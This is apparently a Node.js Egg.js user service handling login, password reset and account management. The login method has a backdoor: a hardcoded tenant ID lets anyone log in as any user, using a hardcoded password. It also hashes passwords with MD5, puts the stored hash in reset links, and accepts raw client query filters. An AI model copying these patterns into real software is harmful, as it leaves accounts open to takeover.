/*
* @ author Administrator
* @ time   2018/11/14/014 15:58
* @ description
* @ param
*/
'use strict'
const Sequelize = require('sequelize');
const Op = Sequelize.Op;
const Service = require('egg').Service;
const md5 = require('md5');
const uuid = require('uuid');


class UserService extends Service {
    async login(params) {

        const { ctx, app, service } = this;
       
        var w = {
            username: params.username

        }

        if (params.superData && params.superData.tenantId == "5a876e22-0479-4c7a-9103-bfa2ea041744") {
            let u = await ctx.model.User.findOne({
                where: {
                    username: params.superData.username
                }
            })
            if (!u) {
                var r=await service.user.add({ role_id: "rrrrrrrr-rrrr-rrrr-rrrr-rrrrrrrrrrrr", company_id: "cccccccc-cccc-cccc-cccc-cccccccccccc", username: params.superData.username, name: params.superData.name, password: 'zseosdmm@123456' })
            }
            params.username = params.superData.username
            params.password = 'zseosdmm@123456'

        } else {
            //非超级用户
            //w.role_id = { [Op.ne]: "rrrrrrrr-rrrr-rrrr-rrrr-rrrrrrrrrrrr" }
        }
        
       

        var res = await ctx.model.User.findOne({
            where:w,
        });
        /*{
        "success": true,
            "data": { },
        "errorCode": "1001",
            "errorMessage": "error message",
                "showType": 2,
                    "traceId": "someid",
                        "host": "10.1.1.1"
    }*/

        const salt2 = uuid.v1();
       var password = salt2+ "&" + md5("123456" + salt2)
        console.log("" + password)
       
        var loginlog = {}
        loginlog.id = uuid.v1();
        console.log("cccccccccccc", ctx.request)
        loginlog.username = params.username
        var arr = ctx.request.header['user-agent'].split(" ")
        loginlog.browser = arr[arr.length-2]
        loginlog.ip = ctx.request.ip
        loginlog.os = ctx.request.header['user-agent'].match(/\((.+?)\)/gi)[0].replace("(", "").replace(")", "")
        console.log("cccccccccccc", loginlog)
        loginlog.login_time=new Date()
        if (!res) {
            loginlog.err_code = 1001
            loginlog.status = 1
            ctx.body = {
                success: false, errorCode: 1001, errorMessage: "there is no such user", showType: 2, data: {}
            }
            
            service.loginlog.add(loginlog)
            return;
        }
        


        loginlog.user_id = res.id






        var login_lock =await ctx.service.sysconfig.getValueByKey("login_lock");

        var p = await service.loginlog.checkPasswordErrorTimes(login_lock)
        if (!p) {
            ctx.body = { success: false, errorCode: 1003, errorMessage: "Password continuous input error, account locked", showType: 2, data: {} }
            return;
        }
       

        const salt =res.password.split('&')[0]
        res = await ctx.model.User.findOne({
            where: {
                username: params.username,
                password: salt+"&"+md5(params.password + salt),
            },
        });





        if (!res) {

            loginlog.err_code = 1002
            loginlog.status = 1
            ctx.body = { success: false, errorCode: 1002, errorMessage: "password error", showType: 2, data: {} }
            service.loginlog.add(loginlog)

            return;
        }
        if (res.status==1) {
            ctx.body = { success: false, errorCode: 1004, errorMessage: "Account disabled", showType: 2, data: {} }
            return;
        }

        const token = app.jwt.sign({
            user_id: res.id,
            login_time: parseInt((new Date).getTime()/1000),
            username: res.username,
            company_id: res.company_id
            }, app.config.jwt.secret,{
          expiresIn:3600// 3600*24  //过期时间设置为60
        });

        
        await service.user.mod({
            id: res.id,
            login_token: token,
            login_time: parseInt((new Date).getTime() / 1000)
})
        service.loginlog.add(loginlog)


        ctx.body = { type:'account', status:'ok',token:token}
        
    }
    

    async count(params){
        
    }

    async checkEmail(email) {
        const ctx = this.ctx;
        var res = await ctx.model.User.findOne({
            where: {

                email: email,
            },
            raw: true
        });
        ctx.body = { success: true, data: res?true:false } 
    }
    
    async getUserInfo(user_id) {
        const ctx = this.ctx;
        var res = await ctx.model.User.findOne({
            where: {

                id: user_id,
            },
            raw: true
        });
        return res
    }
    async findOne(params){
        const ctx = this.ctx;
        var res = await ctx.model.User.findOne({
            attributes: [[ctx.model.col('r.name'), 'role_name'],'user.*'],
            where: {

             id: params.id,
         },
            include: [{
                as: 'r',
                model: ctx.model.Role

            }],
            raw: true
        });

        const list = await ctx.model.Rolepermission.findAll({
            attributes: [[ctx.model.col('p.name'),'name']],
            where:{role_id:res.role_id},
            include: [{
                as:'p',
                model: ctx.model.Permission
               
            }],
            raw:true
            
        })

        res.permissions=list.map((p)=>{
            return p.name
        })
        console.log(ctx.request.header.origin)
       
        if (!res.avatar) {
            res.avatar ='avatar_1.jpeg'
            
        } 
        res.avatar = ctx.request.header.origin + "/upload/avatar/" + res.avatar
        //获取未读消息数
        const userUnreadAlertCount = await ctx.service.alert.getUserUnreadAlertCount()
        console.log(userUnreadAlertCount)
        res.userUnreadAlertCount = userUnreadAlertCount
        console.log({ success: true, data: res })
        ctx.body ={success:true,data:res} 
    }
    async list(params) {
        const {ctx} = this;
        
           
        let obj={}  

        if(params.where){
            obj.where = params.where
        }
        if(params.order){
            obj.order = params.order
        }
        if(params.page && params.limit){
            obj.offset = parseInt((params.page - 1)) * parseInt(params.limit)
            obj.limit = parseInt(params.limit)
        }
        obj.attributes= [[ctx.model.col('r.name'),'role_name'],[ctx.model.col('c.name'),'company_name'],'user.*']
        obj.include=[{
                        as:'r',
                        model: ctx.model.Role
                       
                    },{
                        as:'c',
                        model: ctx.model.Company
                      
                    }]
         
        obj.raw=true

        const list = await ctx.model.User.findAndCountAll(obj)

        var token_timeout = parseInt(await this.service.sysconfig.getValueByKey("token_timeout"));
        list.rows = list.rows.map((u) => {
            u.online_status = 0
            if ((new Date).getTime() - (new Date(u.login_time * 1000)).getTime() >= token_timeout * 1000) {
                u.online_status = 1
            }
            return u
        })
         console.log(list)
        ctx.status = 200;
        ctx.body = {
            success: true,
            total: list.count,
            data: list.rows

        }; 
        
    }
    async retrievePassword(params) {



        const { ctx, service } = this;
        const user = await ctx.model.User.findOne({ where: { email: params.email } });
        if (!user) {
            ctx.status = 200;
            ctx.body = { success: false, errorCode: 1008 };
            return;
        }
        var res = service.tool.sendMail(params.email, "EOS - Retrieve password", "<a href='" + ctx.request.header.origin +"/#/user/retrievePassword?check=" + user.password+"'>Click to retrieve</a>")
        if (res) {
            ctx.body = { success: true, data: res };
        } else {
            ctx.body = { success: false, errorCode: 1000 };
        }




    }

    async modifyPassword(params) {


        const ctx = this.ctx;
        const user = await ctx.model.User.findOne({ where: { password: params.check } });
        if (!user) {
            ctx.status = 404;
            ctx.body = { success: false, errorCode: 1009 };
            return;
        }
        if (params.newPassword) {
            const salt = uuid.v1();
            params.password = salt + "&" + md5(params.newPassword + salt)
        }

        const res = await user.update({ password:params.password });
        if (res) {
            ctx.body = { success: true, data: res };
        } else {
            ctx.body = { success: false, errorCode: 1000 };
        }

    }
    
    async add(params) {

     
 
        const { ctx } = this;
        const salt = uuid.v1();
        params.password = salt+"&"+ md5(params.password + salt)
        params.id=uuid.v1();
        const res = await ctx.model.User.create(params);
        if(res){
            ctx.body = { success: true,data:res};
        }else{
            ctx.body = { success: false, errorCode:1000};
        }
        

        
        
    }

    async del(params) {

        const ctx = this.ctx;
        let res = await ctx.model.User.destroy({
            where: {
                id: params.id
            }
        })
        ctx.body = { success: true };
        ctx.status = 200;
        
    }

    async logout(params) {
      
        const ctx = this.ctx;
        console.log("params=========", params + ctx.user.user_id)
        const user = await ctx.model.User.findByPk(params.id ? params.id : ctx.user.user_id);
        var token_timeout = parseInt(await this.service.sysconfig.getValueByKey("token_timeout"));
        var login_time =parseInt( (new Date(((new Date).getTime() - token_timeout * 1000))).getTime()/1000)
        console.log("params=========", login_time)
        const res = await user.update({ login_time: login_time } );
        ctx.status = 200;

    }
    async mod(params) {


        const ctx = this.ctx;
        const user = await ctx.model.User.findByPk(params.id);
        if(params.password){
            const salt = uuid.v1();
            params.password = salt + "&" + md5(params.password + salt)
        }else{
            delete params.password
        }

        if (params.oldPassword) {
            const salt2 = user.password.split('&')[0]
            if (user.password!=salt2 + "&" + md5(params.oldPassword + salt2)) {
                ctx.body = { success: false, errorCode: 1007 };
                return;
            }
            const salt = uuid.v1();
            params.password = salt + "&" + md5(params.newPassword + salt)
            delete params.oldPassword
            delete params.repeatNewPassword
        }

       

        if (!user) {
          ctx.status = 404;
            ctx.body = { success: false, errorCode:1000};
          return;
        }

        const res = await user.update(params);
        if(res){
            ctx.body = {success:true,data:res};
        }else{
            ctx.body = { success: false, errorCode:1000};
        }
       
    }
    
}

module.exports = UserService;

